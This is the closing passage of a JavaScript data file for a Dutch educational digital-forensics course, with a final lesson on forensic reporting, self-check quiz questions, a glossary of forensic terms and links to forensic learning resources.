          <strong>Laatste woord:</strong> forensiek is geduldig, nauwkeurig en eerlijk puzzelen. Je zoekt niet naar een
          dader, je volgt het bewijs — waar het ook heen leidt. Daarmee ben je nu begonnen. Zaak Zilverlab: gesloten.
        </div>
      `,
      questions: [
        { q: 'Wat moet in een forensisch rapport strikt gescheiden blijven?', options: ['Feiten en interpretatie', 'Namen en tijdstippen', 'Tekst en tabellen', 'Nederlands en Engels'], answer: 0, explain: 'Feiten (wat je zag) scheid je van interpretatie (wat het betekent), zodat de rechter zelf kan wegen.' },
        { q: 'Wat betekent "reproduceerbaar" in dit verband?', options: ['Een ander komt met dezelfde bestanden, tools en commando\'s tot dezelfde conclusie', 'Je kunt het rapport kopieren', 'Het onderzoek was snel', 'Je gebruikte dure software'], answer: 0, explain: 'Reproduceerbaarheid maakt je bevindingen controleerbaar en betrouwbaar; daarom noteer je exact je methode.' },
        { q: 'Wat maakt het bewijs in deze zaak juist zo sterk?', options: ['Meerdere onafhankelijke bronnen (bestand, geheugen, netwerk, logs) wijzen dezelfde kant op', 'Er is maar één bron', 'Het was snel gevonden', 'De verdachte bekende meteen'], answer: 0, explain: 'Bestand, geheugendump, pcap en logs wijzen allemaal naar j.dekker, wexport.exe en 10.10.90.77 — dat bevestigt elkaar.' },
        { q: 'Ik kan een forensisch rapport opbouwen met feiten, interpretatie, reproduceerbaarheid en chain of custody.', noAnswer: true },
      ],
    },
  ],
  terms: [
    { term: 'CTF', def: 'Capture The Flag: een oefening waarin je uitdagingen oplost en geheime codes (vlaggen) verzamelt.' },
    { term: 'Magic bytes (file signature)', def: 'Vaste eerste bytes die het echte bestandstype verraden, ongeacht de naam of extensie.' },
    { term: 'File carving', def: 'Het terughalen van bestanden of fragmenten uit ruwe data (bijv. een schijf- of geheugendump).' },
    { term: 'strings', def: 'Tool die de leesbare tekstfragmenten uit een binair bestand haalt.' },
    { term: 'Hashing (SHA-256)', def: 'Een vingerafdruk van data; elke wijziging geeft een totaal andere hash. Bewijst integriteit.' },
    { term: 'Integriteit', def: 'De zekerheid dat bewijs niet is gewijzigd sinds het veiligstellen; aangetoond met een hash.' },
    { term: 'Chain of custody', def: 'De bewijsketen: wie stelde het bewijs wanneer veilig, met welke machtiging, en de hashes.' },
    { term: 'Machtiging', def: 'Juridische toestemming (bijv. van de rechter-commissaris) om een onderzoek rechtmatig uit te voeren.' },
    { term: 'Exfiltratie', def: 'Het ongeoorloofd naar buiten smokkelen van data, hier via een HTTP-POST naar een extern IP.' },
    { term: 'Insider', def: 'Een interne medewerker die zijn toegang misbruikt om data te stelen of schade te doen.' },
    { term: 'Tijdlijn (timeline)', def: 'Gebeurtenissen uit verschillende bronnen op volgorde gezet, zodat het verhaal zichtbaar wordt.' },
    { term: 'Codering vs. encryptie', def: 'Codering (Base64, ROT13) is omkeerbaar zonder sleutel; encryptie vereist een geheime sleutel.' },
    { term: 'Forensisch rapport', def: 'Verslag dat feiten en interpretatie scheidt, reproduceerbaar is en de bewijsketen vastlegt.' },
  ],
  resources: [
    { title: 'Forensic Focus — artikelen en forums over digitaal forensisch onderzoek', url: 'https://www.forensicfocus.com/' },
    { title: 'CyberDefenders — oefen met complete forensische zaken', url: 'https://cyberdefenders.org/' },
    { title: 'Volatility Foundation — geheugenforensie', url: 'https://www.volatilityfoundation.org/' },
    { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
  ],
});
